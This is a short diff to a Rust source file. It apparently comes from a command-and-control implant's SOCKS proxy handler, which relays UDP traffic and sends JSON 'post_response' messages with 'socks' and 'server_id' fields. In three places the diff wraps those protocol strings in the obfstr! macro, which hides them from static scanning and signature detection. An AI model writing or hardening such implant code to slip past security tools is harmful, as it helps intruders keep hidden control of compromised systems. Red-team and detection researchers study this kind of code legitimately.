@@ -6,6 +6,7 @@ use base64::decode;
 use lazy_static::lazy_static;
 use serde_json::Value;
 use std::net::UdpSocket;
+use obfstr::obfstr;
 const CMD_UDP_ASSOCIATE: u8 = 0x03;
 
 lazy_static! {
@@ -31,8 +32,8 @@ pub fn handle_socks(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     if exit {
         CONNECTIONS.lock()?.remove(&server_id);
         let response = serde_json::json!({
-            "action": "post_response",
-            "socks": [
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("socks"): [
                 {
                     "exit": exit,
                     "server_id": server_id,
@@ -114,8 +115,8 @@ pub fn handle_socks(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
         let b64_response = base64::encode(&response);
         let response = serde_json::json!({
-            "action": "post_response",
-            "socks": [
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("socks"): [
                 {
                     "exit": exit,
                     "server_id": server_id,
@@ -163,8 +164,8 @@ pub fn handle_socks(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
         let b64_response = base64::encode(&response_data);
         let response = serde_json::json!({
-            "action": "post_response",
-            "socks": [
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("socks"): [
                 {
                     "exit": false,
                     "server_id": server_id,
